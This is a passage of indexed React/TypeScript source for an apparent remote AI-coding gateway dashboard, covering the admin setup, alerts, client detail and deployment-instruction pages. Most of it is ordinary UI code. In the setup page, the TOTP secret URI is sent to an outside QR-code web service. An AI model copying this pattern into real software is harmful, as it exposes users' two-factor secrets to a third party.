className=\"status-dot\" />\n                {run.status}\n              </span>\n            </li>\n          ))}\n        </ul>\n      )}\n    </div>\n  );\n}\n\nexport default RunList;", "metadata": {"file": "ui/src/components/RunList.tsx", "start_line": 1, "end_line": 143, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/Setup.tsx", "location": "ui/src/components/Setup.tsx:1", "score": 0.0, "content": "import { useState } from 'react';\n\ninterface Props {\n  onComplete: () => void;\n}\n\nfunction Setup({ onComplete }: Props) {\n  const [username, setUsername] = useState('');\n  const [password, setPassword] = useState('');\n  const [confirmPassword, setConfirmPassword] = useState('');\n  const [enableTotp, setEnableTotp] = useState(true);\n  const [totpUri, setTotpUri] = useState('');\n  const [error, setError] = useState('');\n  const [loading, setLoading] = useState(false);\n\n  async function handleSubmit(e: React.FormEvent) {\n    e.preventDefault();\n    setError('');\n\n    if (password !== confirmPassword) {\n      setError('Passwords do not match');\n      return;\n    }\n\n    if (password.length < 12) {\n      setError('Password must be at least 12 characters');\n      return;\n    }\n\n    setLoading(true);\n\n    try {\n      const res = await fetch('/api/auth/setup', {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({\n          username,\n          password,\n          enableTotp\n        })\n      });\n\n      const data = await res.json();\n\n      if (!res.ok) {\n        setError(data.error || 'Setup failed');\n        return;\n      }\n\n      if (data.totpUri) {\n        setTotpUri(data.totpUri);\n      } else {\n        onComplete();\n      }\n    } catch (err) {\n      setError('Connection error');\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  if (totpUri) {\n    return (\n      <div className=\"login-container\">\n        <div className=\"card login-card\">\n          <h1 className=\"login-title\">Setup Complete</h1>\n\n          <div style={{ marginBottom: '24px' }}>\n            <p style={{ marginBottom: '12px', color: 'var(--text-secondary)' }}>\n              Scan this QR code with your authenticator app:\n            </p>\n            <div style={{\n              background: 'white',\n              padding: '16px',\n              borderRadius: '8px',\n              textAlign: 'center'\n            }}>\n              <img\n                src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(totpUri)}`}\n                alt=\"TOTP QR Code\"\n                style={{ maxWidth: '100%' }}\n              />\n            </div>\n            <p style={{\n              marginTop: '12px',\n              fontSize: '12px',\n              color: 'var(--text-muted)',\n              wordBreak: 'break-all'\n            }}>\n              Manual entry: {totpUri}\n            </p>\n          </div>\n\n          <button\n            className=\"btn btn-primary\"\n            style={{ width: '100%' }}\n            onClick={onComplete}\n          >\n            Continue to Login\n          </button>\n        </div>\n      </div>\n    );\n  }\n\n  return (\n    <div className=\"login-container\">\n      <div className=\"card login-card\">\n        <h1 className=\"login-title\">Initial Setup</h1>\n        <p style={{ marginBottom: '24px', color: 'var(--text-secondary)', textAlign: 'center' }}>\n          Create your admin account\n        </p>\n\n        <form onSubmit={handleSubmit}>\n          <div className=\"form-group\">\n            <label className=\"form-label\">Username</label>\n            <input\n              type=\"text\"\n              className=\"form-input\"\n              value={username}\n              onChange={(e) => setUsername(e.target.value)}\n              required\n              minLength={3}\n              maxLength={50}\n              pattern=\"[a-zA-Z0-9_-]+\"\n              autoComplete=\"username\"\n              autoFocus\n            />\n          </div>\n\n          <div className=\"form-group\">\n            <label className=\"form-label\">Password (min 12 characters)</label>\n            <input\n              type=\"password\"\n              className=\"form-input\"\n              value={password}\n              onChange={(e) => setPassword(e.target.value)}\n              required\n              minLength={12}\n              autoComplete=\"new-password\"\n            />\n          </div>\n\n          <div className=\"form-group\">\n            <label className=\"form-label\">Confirm Password</label>\n            <input\n              type=\"password\"\n              className=\"form-input\"\n              value={confirmPassword}\n              onChange={(e) => setConfirmPassword(e.target.value)}\n              required\n              autoComplete=\"new-password\"\n            />\n          </div>\n\n          <div className=\"form-group\">\n            <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' }}>\n              <input\n                type=\"checkbox\"\n                checked={enableTotp}\n                onChange={(e) => setEnableTotp(e.target.checked)}\n              />\n              <span className=\"form-label\" style={{ margin: 0 }}>\n                Enable TOTP two-factor authentication (recommended)\n              </span>\n            </label>\n          </div>\n\n          {error && (\n            <div style={{ color: 'var(--accent-red)', marginBottom: '16px', fontSize: '14px' }}>\n              {error}\n            </div>\n          )}\n\n          <button\n            type=\"submit\"\n            className=\"btn btn-primary\"\n            style={{ width: '100%' }}\n            disabled={loading}\n          >\n            {loading ? 'Creating...' : 'Create Admin Account'}\n          </button>\n        </form>\n      </div>\n    </div>\n  );\n}\n\nexport default Setup;", "metadata": {"file": "ui/src/components/Setup.tsx", "start_line": 1, "end_line": 189, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Alerts.tsx", "location": "ui/src/pages/Alerts.tsx:1", "score": 0.0, "content": "import { useState, useEffect, useCallback } from 'react';\nimport { useNavigate } from 'react-router-dom';\nimport { Modal, ConfirmModal, useToast } from '../components/ui';\n\ninterface Alert {\n  id: string;\n  rule_id: string | null;\n  type: string;\n  severity: string;\n  title: string;\n  message: string | null;\n  target_type: string | null;\n  target_id: string | null;\n  acknowledged: number;\n  acknowledged_by: string | null;\n  acknowledged_at: number | null;\n  created_at: number;\n}\n\ninterface AlertRule {\n  id: string;\n  name: string;\n  type: string;\n  config: { timeoutMinutes?: number };\n  enabled: number;\n  created_at: number;\n}\n\ninterface Props {\n  user: { id: string; username: string; role: string } | null;\n}\n\nconst alertTypeLabels: Record<string, string> = {\n  run_failed: 'Run Failed',\n  waiting_approval_timeout: 'Waiting Approval Timeout',\n  client_offline_active_runs: 'Client Offline with Active Runs',\n};\n\nconst severityColors: Record<string, string> = {\n  critical: 'var(--accent-red)',\n  warning: 'var(--accent-yellow)',\n  info: 'var(--accent-blue)',\n};\n\nfunction formatRelativeTime(timestamp: number): string {\n  const now = Math.floor(Date.now() / 1000);\n  const diff = now - timestamp;\n\n  if (diff < 60) return 'just now';\n  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;\n  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;\n  return `${Math.floor(diff / 86400)}d ago`;\n}\n\nexport function Alerts({ user }: Props) {\n  const navigate = useNavigate();\n  const { addToast } = useToast();\n\n  // State\n  const [alerts, setAlerts] = useState<Alert[]>([]);\n  const [rules, setRules] = useState<AlertRule[]>([]);\n  const [unacknowledgedCount, setUnacknowledgedCount] = useState(0);\n  const [loading, setLoading] = useState(true);\n  const [showRulesModal, setShowRulesModal] = useState(false);\n  const [showAddRuleModal, setShowAddRuleModal] = useState(false);\n  const [showAckAllConfirm, setShowAckAllConfirm] = useState(false);\n  const [filter, setFilter] = useState<'all' | 'unacknowledged'>('unacknowledged');\n\n  // New rule form\n  const [newRuleName, setNewRuleName] = useState('');\n  const [newRuleType, setNewRuleType] = useState('run_failed');\n  const [newRuleTimeout, setNewRuleTimeout] = useState(30);\n\n  const canOperate = user?.role === 'admin' || user?.role === 'operator';\n\n  // Fetch alerts\n  const fetchAlerts = useCallback(async () => {\n    try {\n      const params = new URLSearchParams();\n      if (filter === 'unacknowledged') {\n        params.set('acknowledged', 'false');\n      }\n      params.set('limit', '50');\n\n      const res = await fetch(`/api/alerts?${params}`);\n      if (res.ok) {\n        const data = await res.json();\n        setAlerts(data.alerts || []);\n        setUnacknowledgedCount(data.unacknowledged || 0);\n      }\n    } catch (err) {\n      console.error('Failed to fetch alerts:', err);\n    } finally {\n      setLoading(false);\n    }\n  }, [filter]);\n\n  // Fetch rules\n  const fetchRules = useCallback(async () => {\n    try {\n      const res = await fetch('/api/alerts/rules');\n      if (res.ok) {\n        const data = await res.json();\n        setRules(data || []);\n      }\n    } catch (err) {\n      console.error('Failed to fetch rules:', err);\n    }\n  }, []);\n\n  // Initial fetch\n  useEffect(() => {\n    fetchAlerts();\n    fetchRules();\n    const interval = setInterval(fetchAlerts, 30000);\n    return () => clearInterval(interval);\n  }, [fetchAlerts, fetchRules]);\n\n  // Acknowledge single alert\n  const acknowledgeAlert = async (alertId: string) => {\n    try {\n      const res = await fetch(`/api/alerts/${alertId}/acknowledge`, { method: 'POST' });\n      if (res.ok) {\n        fetchAlerts();\n      }\n    } catch (err) {\n      addToast('error', 'Failed to acknowledge alert');\n    }\n  };\n\n  // Acknowledge all alerts\n  const acknowledgeAll = async () => {\n    try {\n      const res = await fetch('/api/alerts/acknowledge-all', { method: 'POST' });\n      if (res.ok) {\n        addToast('success', 'All alerts acknowledged');\n        setShowAckAllConfirm(false);\n        fetchAlerts();\n      }\n    } catch (err) {\n      addToast('error', 'Failed to acknowledge alerts');\n    }\n  };\n\n  // Create rule\n  const createRule = async () => {\n    if (!newRuleName) {\n      addToast('error', 'Rule name is required');\n      return;\n    }\n\n    try {\n      const res = await fetch('/api/alerts/rules', {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({\n          name: newRuleName,\n          type: newRuleType,\n          config: newRuleType === 'waiting_approval_timeout' ? { timeoutMinutes: newRuleTimeout } : {},\n          enabled: true,\n        }),\n      });\n      if (res.ok) {\n        addToast('success', 'Alert rule created');\n        setShowAddRuleModal(false);\n        setNewRuleName('');\n        fetchRules();\n      } else {\n        const error = await res.json();\n        addToast('error', error.error || 'Failed to create rule');\n      }\n    } catch (err) {\n      addToast('error', 'Failed to create rule');\n    }\n  };\n\n  // Toggle rule enabled\n  const toggleRule = async (ruleId: string, enabled: boolean) => {\n    try {\n      const res = await fetch(`/api/alerts/rules/${ruleId}`, {\n        method: 'PATCH',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({ enabled }),\n      });\n      if (res.ok) {\n        fetchRules();\n      }\n    } catch (err) {\n      addToast('error', 'Failed to update rule');\n    }\n  };\n\n  // Delete rule\n  const deleteRule = async (ruleId: string) => {\n    try {\n      const res = await fetch(`/api/alerts/rules/${ruleId}`, { method: 'DELETE' });\n      if (res.ok) {\n        addToast('success', 'Rule deleted');\n        fetchRules();\n      }", "metadata": {"file": "ui/src/pages/Alerts.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Alerts.tsx", "location": "ui/src/pages/Alerts.tsx:201", "score": 0.0, "content": "    } catch (err) {\n      addToast('error', 'Failed to delete rule');\n    }\n  };\n\n  // Navigate to alert target\n  const handleAlertClick = (alert: Alert) => {\n    if (alert.target_type === 'run' && alert.target_id) {\n      navigate(`/runs/${alert.target_id}`);\n    } else if (alert.target_type === 'client' && alert.target_id) {\n      navigate(`/clients/${alert.target_id}`);\n    }\n  };\n\n  return (\n    <div className=\"alerts-page\">\n      {/* Header */}\n      <div className=\"page-header\">\n        <h2 className=\"page-title\">Alerts</h2>\n        <div style={{ display: 'flex', gap: '8px' }}>\n          {canOperate && (\n            <button className=\"btn\" onClick={() => setShowRulesModal(true)}>\n              Manage Rules\n            </button>\n          )}\n          {unacknowledgedCount > 0 && (\n            <button\n              className=\"btn btn-primary\"\n              onClick={() => setShowAckAllConfirm(true)}\n            >\n              Acknowledge All ({unacknowledgedCount})\n            </button>\n          )}\n        </div>\n      </div>\n\n      {/* Filter tabs */}\n      <div className=\"tabs\" style={{ marginBottom: '16px' }}>\n        <button\n          className={`tab ${filter === 'unacknowledged' ? 'tab-active' : ''}`}\n          onClick={() => setFilter('unacknowledged')}\n        >\n          Unacknowledged\n          {unacknowledgedCount > 0 && (\n            <span className=\"tab-badge\">{unacknowledgedCount}</span>\n          )}\n        </button>\n        <button\n          className={`tab ${filter === 'all' ? 'tab-active' : ''}`}\n          onClick={() => setFilter('all')}\n        >\n          All Alerts\n        </button>\n      </div>\n\n      {/* Alerts list */}\n      {loading ? (\n        <div className=\"loading\">\n          <div className=\"spinner\" />\n        </div>\n      ) : alerts.length === 0 ? (\n        <div className=\"empty-state\">\n          <h2>No alerts</h2>\n          <p>\n            {filter === 'unacknowledged'\n              ? 'All alerts have been acknowledged.'\n              : 'No alerts have been triggered yet.'}\n          </p>\n        </div>\n      ) : (\n        <div className=\"alert-list\">\n          {alerts.map((alert) => (\n            <div\n              key={alert.id}\n              className=\"alert-item\"\n              style={{\n                borderLeft: `4px solid ${severityColors[alert.severity] || 'var(--border-color)'}`,\n                opacity: alert.acknowledged ? 0.6 : 1,\n              }}\n            >\n              <div\n                className=\"alert-content\"\n                onClick={() => handleAlertClick(alert)}\n                style={{ cursor: alert.target_id ? 'pointer' : 'default' }}\n              >\n                <div className=\"alert-header\">\n                  <span\n                    className=\"alert-severity\"\n                    style={{ color: severityColors[alert.severity] }}\n                  >\n                    {alert.severity.toUpperCase()}\n                  </span>\n                  <span className=\"alert-type\">\n                    {alertTypeLabels[alert.type] || alert.type}\n                  </span>\n                  <span className=\"alert-time\">\n                    {formatRelativeTime(alert.created_at)}\n                  </span>\n                </div>\n                <div className=\"alert-title\">{alert.title}</div>\n                {alert.message && (\n                  <div className=\"alert-message\">{alert.message}</div>\n                )}\n              </div>\n              {!alert.acknowledged && (\n                <button\n                  className=\"btn btn-sm\"\n                  onClick={() => acknowledgeAlert(alert.id)}\n                  aria-label=\"Acknowledge alert\"\n                >\n                  \u2713\n                </button>\n              )}\n            </div>\n          ))}\n        </div>\n      )}\n\n      {/* Rules Modal */}\n      <Modal\n        open={showRulesModal}\n        onClose={() => setShowRulesModal(false)}\n        title=\"Alert Rules\"\n        size=\"lg\"\n        footer={\n          <>\n            <button className=\"btn\" onClick={() => setShowRulesModal(false)}>\n              Close\n            </button>\n            {canOperate && (\n              <button\n                className=\"btn btn-primary\"\n                onClick={() => {\n                  setShowRulesModal(false);\n                  setShowAddRuleModal(true);\n                }}\n              >\n                Add Rule\n              </button>\n            )}\n          </>\n        }\n      >\n        {rules.length === 0 ? (\n          <div className=\"empty-state-small\">\n            No alert rules configured yet.\n          </div>\n        ) : (\n          <div className=\"rules-list\">\n            {rules.map((rule) => (\n              <div key={rule.id} className=\"rule-item\">\n                <div className=\"rule-info\">\n                  <div className=\"rule-name\">{rule.name}</div>\n                  <div className=\"rule-type\">\n                    {alertTypeLabels[rule.type] || rule.type}\n                    {rule.config.timeoutMinutes && (\n                      <span> ({rule.config.timeoutMinutes} min)</span>\n                    )}\n                  </div>\n                </div>\n                <div className=\"rule-actions\">\n                  <label className=\"switch\">\n                    <input\n                      type=\"checkbox\"\n                      checked={!!rule.enabled}\n                      onChange={(e) => toggleRule(rule.id, e.target.checked)}\n                    />\n                    <span className=\"slider\" />\n                  </label>\n                  {canOperate && (\n                    <button\n                      className=\"btn btn-sm btn-danger\"\n                      onClick={() => deleteRule(rule.id)}\n                    >\n                      Delete\n                    </button>\n                  )}\n                </div>\n              </div>\n            ))}\n          </div>\n        )}\n      </Modal>\n\n      {/* Add Rule Modal */}\n      <Modal\n        open={showAddRuleModal}\n        onClose={() => setShowAddRuleModal(false)}\n        title=\"Add Alert Rule\"\n        footer={\n          <>\n            <button className=\"btn\" onClick={() => setShowAddRuleModal(false)}>\n              Cancel\n            </button>\n            <button className=\"btn btn-primary\" onClick={createRule}>\n              Create Rule\n            </button>\n          </>\n        }\n      >", "metadata": {"file": "ui/src/pages/Alerts.tsx", "start_line": 201, "end_line": 400, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Alerts.tsx", "location": "ui/src/pages/Alerts.tsx:401", "score": 0.0, "content": "        <div className=\"form-group\">\n          <label className=\"form-label\">Rule Name</label>\n          <input\n            type=\"text\"\n            className=\"form-input\"\n            value={newRuleName}\n            onChange={(e) => setNewRuleName(e.target.value)}\n            placeholder=\"e.g., Notify on failures\"\n          />\n        </div>\n\n        <div className=\"form-group\">\n          <label className=\"form-label\">Trigger Type</label>\n          <select\n            className=\"form-input\"\n            value={newRuleType}\n            onChange={(e) => setNewRuleType(e.target.value)}\n          >\n            <option value=\"run_failed\">When a run fails</option>\n            <option value=\"waiting_approval_timeout\">When approval times out</option>\n            <option value=\"client_offline_active_runs\">When client goes offline with active runs</option>\n          </select>\n        </div>\n\n        {newRuleType === 'waiting_approval_timeout' && (\n          <div className=\"form-group\">\n            <label className=\"form-label\">Timeout (minutes)</label>\n            <input\n              type=\"number\"\n              className=\"form-input\"\n              value={newRuleTimeout}\n              onChange={(e) => setNewRuleTimeout(parseInt(e.target.value) || 30)}\n              min={1}\n              max={1440}\n            />\n          </div>\n        )}\n\n        <p style={{ fontSize: '12px', color: 'var(--text-muted)', marginTop: '12px' }}>\n          Note: V1 supports in-app alerts only. Email/SMS notifications will be added in future versions.\n        </p>\n      </Modal>\n\n      {/* Acknowledge All Confirmation */}\n      <ConfirmModal\n        open={showAckAllConfirm}\n        onClose={() => setShowAckAllConfirm(false)}\n        onConfirm={acknowledgeAll}\n        title=\"Acknowledge All Alerts\"\n        message={`Are you sure you want to acknowledge all ${unacknowledgedCount} unacknowledged alerts?`}\n        confirmText=\"Acknowledge All\"\n      />\n    </div>\n  );\n}\n\nexport default Alerts;", "metadata": {"file": "ui/src/pages/Alerts.tsx", "start_line": 401, "end_line": 457, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/ClientDetail.tsx", "location": "ui/src/pages/ClientDetail.tsx:1", "score": 0.0, "content": "import { useState, useEffect, useCallback } from 'react';\nimport { useParams, Link, useNavigate } from 'react-router-dom';\nimport {\n  StatusPill,\n  RunCard,\n  type Run,\n  type Client,\n  ConfirmModal,\n  useToast,\n} from '../components/ui';\n\ninterface ClientDetail extends Client {\n  runs: Run[];\n  recentEvents: {\n    id: number;\n    run_id: string;\n    type: string;\n    data: string;\n    timestamp: number;\n  }[];\n}\n\ninterface Props {\n  user: { id: string; username: string; role: string } | null;\n}\n\nfunction formatRelativeTime(timestamp: number): string {\n  const now = Math.floor(Date.now() / 1000);\n  const diff = now - timestamp;\n\n  if (diff < 60) return 'just now';\n  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;\n  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;\n  return `${Math.floor(diff / 86400)}d ago`;\n}\n\nfunction formatTime(timestamp: number): string {\n  return new Date(timestamp * 1000).toLocaleString();\n}\n\nexport function ClientDetailPage({ user }: Props) {\n  const { clientId } = useParams<{ clientId: string }>();\n  const navigate = useNavigate();\n  const { addToast } = useToast();\n\n  // State\n  const [client, setClient] = useState<ClientDetail | null>(null);\n  const [loading, setLoading] = useState(true);\n  const [showDisableConfirm, setShowDisableConfirm] = useState(false);\n  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);\n  const [actionLoading, setActionLoading] = useState(false);\n\n  const canOperate = user?.role === 'admin' || user?.role === 'operator';\n  const isAdmin = user?.role === 'admin';\n\n  // Fetch client\n  const fetchClient = useCallback(async () => {\n    try {\n      const res = await fetch(`/api/clients/${clientId}`);\n      if (res.ok) {\n        const data = await res.json();\n        setClient(data);\n      } else if (res.status === 404) {\n        navigate('/clients', { replace: true });\n        addToast('error', 'Client not found');\n      }\n    } catch (err) {\n      console.error('Failed to fetch client:', err);\n      addToast('error', 'Failed to load client');\n    } finally {\n      setLoading(false);\n    }\n  }, [clientId, navigate, addToast]);\n\n  // Initial fetch\n  useEffect(() => {\n    fetchClient();\n    const interval = setInterval(fetchClient, 15000);\n    return () => clearInterval(interval);\n  }, [fetchClient]);\n\n  // Toggle operator enabled\n  const toggleOperatorEnabled = async () => {\n    if (!client) return;\n\n    setActionLoading(true);\n    try {\n      const res = await fetch(`/api/clients/${clientId}`, {\n        method: 'PATCH',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({ operatorEnabled: !client.operator_enabled }),\n      });\n      if (res.ok) {\n        addToast('success', `Operator actions ${client.operator_enabled ? 'disabled' : 'enabled'}`);\n        setShowDisableConfirm(false);\n        fetchClient();\n      } else {\n        const error = await res.json();\n        addToast('error', error.error || 'Failed to update client');\n      }\n    } catch (err) {\n      addToast('error', 'Failed to update client');\n    } finally {\n      setActionLoading(false);\n    }\n  };\n\n  // Delete client\n  const deleteClient = async () => {\n    setActionLoading(true);\n    try {\n      const res = await fetch(`/api/clients/${clientId}`, { method: 'DELETE' });\n      if (res.ok) {\n        addToast('success', 'Client deleted');\n        navigate('/clients', { replace: true });\n      } else {\n        const error = await res.json();\n        addToast('error', error.error || 'Failed to delete client');\n      }\n    } catch (err) {\n      addToast('error', 'Failed to delete client');\n    } finally {\n      setActionLoading(false);\n      setShowDeleteConfirm(false);\n    }\n  };\n\n  if (loading) {\n    return (\n      <div className=\"loading\">\n        <div className=\"spinner\" />\n      </div>\n    );\n  }\n\n  if (!client) {\n    return (\n      <div className=\"empty-state\">\n        <h2>Client not found</h2>\n        <Link to=\"/clients\" className=\"btn\">\n          Back to clients\n        </Link>\n      </div>\n    );\n  }\n\n  const activeRuns = client.runs?.filter(r => r.status === 'running') || [];\n  const recentRuns = client.runs?.slice(0, 10) || [];\n\n  return (\n    <div className=\"client-detail\">\n      {/* Header */}\n      <div className=\"client-header\">\n        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '12px' }}>\n          <Link to=\"/clients\" className=\"btn btn-sm\">\n            \u2190 Back\n          </Link>\n          <StatusPill status={client.status as any} />\n          {!client.operator_enabled && (\n            <span\n              style={{\n                padding: '4px 8px',\n                fontSize: '11px',\n                background: 'rgba(210, 153, 34, 0.15)',\n                color: 'var(--accent-yellow)',\n                borderRadius: '4px',\n              }}\n            >\n              Operator Disabled\n            </span>\n          )}\n        </div>\n\n        <h1 style={{ fontSize: '20px', fontWeight: 600, marginBottom: '8px' }}>\n          {client.display_name}\n        </h1>\n\n        <div\n          style={{\n            fontSize: '13px',\n            color: 'var(--text-secondary)',\n            fontFamily: 'monospace',\n            marginBottom: '12px',\n          }}\n        >\n          {client.agent_id}\n        </div>\n\n        <div\n          style={{\n            display: 'flex',\n            flexWrap: 'wrap',\n            gap: '16px',\n            fontSize: '13px',\n            color: 'var(--text-secondary)',\n          }}\n        >\n          <span>\n            <strong>Last seen:</strong> {formatRelativeTime(client.last_seen_at)}\n          </span>", "metadata": {"file": "ui/src/pages/ClientDetail.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/ClientDetail.tsx", "location": "ui/src/pages/ClientDetail.tsx:201", "score": 0.0, "content": "          {client.version && (\n            <span>\n              <strong>Version:</strong> {client.version}\n            </span>\n          )}\n          {client.created_at && (\n            <span>\n              <strong>Connected:</strong> {formatTime(client.created_at)}\n            </span>\n          )}\n        </div>\n      </div>\n\n      {/* Actions */}\n      {canOperate && (\n        <div\n          style={{\n            display: 'flex',\n            gap: '8px',\n            marginTop: '16px',\n            marginBottom: '24px',\n            flexWrap: 'wrap',\n          }}\n        >\n          <button\n            className=\"btn\"\n            onClick={() => setShowDisableConfirm(true)}\n          >\n            {client.operator_enabled ? 'Disable Operator Actions' : 'Enable Operator Actions'}\n          </button>\n          {isAdmin && (\n            <button\n              className=\"btn btn-danger\"\n              onClick={() => setShowDeleteConfirm(true)}\n            >\n              Delete Client\n            </button>\n          )}\n        </div>\n      )}\n\n      {/* Capabilities */}\n      {client.capabilities && client.capabilities.length > 0 && (\n        <section className=\"client-section\">\n          <h2 className=\"section-title\">Capabilities</h2>\n          <div\n            style={{\n              display: 'flex',\n              flexWrap: 'wrap',\n              gap: '8px',\n            }}\n          >\n            {client.capabilities.map((cap, i) => (\n              <span\n                key={i}\n                style={{\n                  padding: '4px 10px',\n                  fontSize: '12px',\n                  background: 'var(--bg-tertiary)',\n                  borderRadius: '4px',\n                  fontFamily: 'monospace',\n                }}\n              >\n                {cap}\n              </span>\n            ))}\n          </div>\n        </section>\n      )}\n\n      {/* Active Runs */}\n      {activeRuns.length > 0 && (\n        <section className=\"client-section\">\n          <h2 className=\"section-title\">\n            Active Runs\n            <span\n              style={{\n                marginLeft: '8px',\n                padding: '2px 8px',\n                fontSize: '12px',\n                background: 'rgba(59, 185, 80, 0.15)',\n                color: 'var(--accent-green)',\n                borderRadius: '10px',\n              }}\n            >\n              {activeRuns.length}\n            </span>\n          </h2>\n          <div className=\"run-list\">\n            {activeRuns.map((run) => (\n              <RunCard key={run.id} run={run as Run} showClient={false} />\n            ))}\n          </div>\n        </section>\n      )}\n\n      {/* Recent Runs */}\n      <section className=\"client-section\">\n        <div className=\"section-header\">\n          <h2 className=\"section-title\">Recent Runs</h2>\n          <Link\n            to={`/runs?clientId=${client.id}`}\n            className=\"btn btn-sm\"\n          >\n            View All\n          </Link>\n        </div>\n        {recentRuns.length === 0 ? (\n          <div className=\"empty-state-small\">\n            No runs from this client yet.\n          </div>\n        ) : (\n          <div className=\"run-list\">\n            {recentRuns.map((run) => (\n              <RunCard key={run.id} run={run as Run} compact showClient={false} />\n            ))}\n          </div>\n        )}\n      </section>\n\n      {/* Recent Events */}\n      {client.recentEvents && client.recentEvents.length > 0 && (\n        <section className=\"client-section\">\n          <h2 className=\"section-title\">Recent Events</h2>\n          <div className=\"event-list\">\n            {client.recentEvents.slice(0, 20).map((event) => (\n              <div\n                key={event.id}\n                className=\"event-item\"\n                onClick={() => navigate(`/runs/${event.run_id}`)}\n                style={{ cursor: 'pointer' }}\n              >\n                <span\n                  style={{\n                    width: '80px',\n                    flexShrink: 0,\n                    fontSize: '11px',\n                    color: 'var(--text-muted)',\n                  }}\n                >\n                  {formatRelativeTime(event.timestamp)}\n                </span>\n                <span\n                  style={{\n                    padding: '2px 6px',\n                    fontSize: '10px',\n                    background: 'var(--bg-tertiary)',\n                    borderRadius: '3px',\n                    textTransform: 'uppercase',\n                    flexShrink: 0,\n                  }}\n                >\n                  {event.type}\n                </span>\n                <span\n                  style={{\n                    flex: 1,\n                    overflow: 'hidden',\n                    textOverflow: 'ellipsis',\n                    whiteSpace: 'nowrap',\n                    fontSize: '12px',\n                    fontFamily: 'monospace',\n                  }}\n                >\n                  {event.data.slice(0, 80)}\n                </span>\n              </div>\n            ))}\n          </div>\n        </section>\n      )}\n\n      {/* Disable Operator Confirmation */}\n      <ConfirmModal\n        open={showDisableConfirm}\n        onClose={() => setShowDisableConfirm(false)}\n        onConfirm={toggleOperatorEnabled}\n        title={client.operator_enabled ? 'Disable Operator Actions' : 'Enable Operator Actions'}\n        message={\n          client.operator_enabled\n            ? 'Disabling operator actions will prevent commands from being sent to this client. Existing runs will continue but no new commands can be issued.'\n            : 'Enabling operator actions will allow commands to be sent to this client.'\n        }\n        confirmText={client.operator_enabled ? 'Disable' : 'Enable'}\n        danger={!!client.operator_enabled}\n        loading={actionLoading}\n      />\n\n      {/* Delete Confirmation */}\n      <ConfirmModal\n        open={showDeleteConfirm}\n        onClose={() => setShowDeleteConfirm(false)}\n        onConfirm={deleteClient}\n        title=\"Delete Client\"\n        message=\"Are you sure you want to delete this client? This action cannot be undone. Associated runs will be preserved but will no longer be linked to this client.\"\n        confirmText=\"Delete Client\"\n        danger\n        loading={actionLoading}\n      />\n    </div>", "metadata": {"file": "ui/src/pages/ClientDetail.tsx", "start_line": 201, "end_line": 400, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/ClientDetail.tsx", "location": "ui/src/pages/ClientDetail.tsx:401", "score": 0.0, "content": "  );\n}\n\nexport default ClientDetailPage;", "metadata": {"file": "ui/src/pages/ClientDetail.tsx", "start_line": 401, "end_line": 404, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Clients.tsx", "location": "ui/src/pages/Clients.tsx:1", "score": 0.0, "content": "import { useState, useEffect, useCallback } from 'react';\nimport { useSearchParams } from 'react-router-dom';\nimport {\n  ClientCard,\n  type Client,\n  FilterBar,\n  FilterSelect,\n  SearchInput,\n  type FilterOption,\n  useToast,\n} from '../components/ui';\n\ntype OSType = 'windows' | 'macos' | 'linux';\n\ninterface DeploymentInstructions {\n  title: string;\n  steps: string[];\n  commands: string[];\n}\n\ninterface ClientsResponse {\n  clients: Client[];\n  total: number;\n  limit: number;\n  offset: number;\n}\n\ninterface Props {\n  user: { id: string; username: string; role: string } | null;\n}\n\nconst statusOptions: FilterOption[] = [\n  { value: 'all', label: 'All Statuses' },\n  { value: 'online', label: 'Online' },\n  { value: 'degraded', label: 'Degraded' },\n  { value: 'offline', label: 'Offline' },\n];\n\nconst deploymentInstructions: Record<OSType, DeploymentInstructions> = {\n  windows: {\n    title: 'Windows Deployment',\n    steps: [\n      'Download and install Node.js 20+ from nodejs.org',\n      'Clone or download the AI Remote Coder repository',\n      'Open PowerShell and navigate to the project directory',\n      'Run the setup script to start the gateway',\n      'The UI will be available at https://localhost:3100',\n      'Create a run from the UI to get the run-id and token',\n      'Connect a client using the provided run-id and token',\n    ],\n    commands: [\n      'cd C:\\\\path\\\\to\\\\ai-remote-coder',\n      '.\\\\run.ps1',\n      '.\\\\wrapper\\\\ai-runner start --run-id <id> --token <token>',\n    ],\n  },\n  macos: {\n    title: 'macOS Deployment',\n    steps: [\n      'Install Node.js 20+ using Homebrew or from nodejs.org',\n      'Clone the repository: git clone <repo-url>',\n      'Navigate to the project directory',\n      'Make the run script executable: chmod +x ./run.sh',\n      'Run the setup script: ./run.sh',\n      'Access the UI at https://localhost:3100',\n      'Create a run from the UI to get credentials',\n      'Connect a client with the run-id and token',\n    ],\n    commands: [\n      'brew install node',\n      'git clone <repository-url>',\n      'cd ai-remote-coder',\n      'chmod +x ./run.sh',\n      './run.sh',\n      './wrapper/ai-runner start --run-id <id> --token <token>',\n    ],\n  },\n  linux: {\n    title: 'Linux Deployment',\n    steps: [\n      'Install Node.js 20+ using your package manager',\n      'Clone the repository to your desired location',\n      'Install dependencies with npm',\n      'Build the project: npm run build',\n      'Start the gateway with npm',\n      'The UI will be available at https://localhost:3100',\n      'Create a run from the UI to get credentials',\n      'Connect clients using the provided credentials',\n    ],\n    commands: [\n      '# Ubuntu/Debian:',\n      'sudo apt-get install nodejs npm',\n      'git clone <repository-url>',\n      'cd ai-remote-coder',\n      'npm install',\n      'npm run build',\n      'npm run start -w gateway',\n      